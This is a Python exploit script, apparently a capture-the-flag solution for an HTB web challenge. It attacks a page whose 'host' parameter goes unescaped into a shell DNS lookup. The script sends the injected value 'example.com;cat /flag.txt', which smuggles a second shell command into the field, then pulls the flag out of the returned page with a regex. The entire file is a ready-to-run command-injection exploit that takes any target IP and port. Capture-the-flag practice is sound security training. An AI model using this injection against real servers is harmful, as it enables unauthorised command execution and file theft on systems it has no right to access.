#!/usr/bin/env python3
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# The host parameter goes into a shell command for the DNS lookup without
# escaping. A ";" ends the lookup and runs a second command, and its output
# comes back in the same page.


def get(url):
    try:
        with urllib.request.urlopen(url, timeout=20) as resp:
            return resp.read().decode(errors="replace")
    except urllib.error.HTTPError as err:
        return err.read().decode(errors="replace")


def exploit(host, port):
    base = f"http://{host}:{port}"

    query = urllib.parse.urlencode({"host": "example.com;cat /flag.txt"})
    page = get(f"{base}/?{query}")
    flag = re.search(r"HTB\{[^}]*\}", page)
    if not flag:
        raise RuntimeError("flag not found in lookup output")
    print(f"[+] Flag:\n{flag.group(0)}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
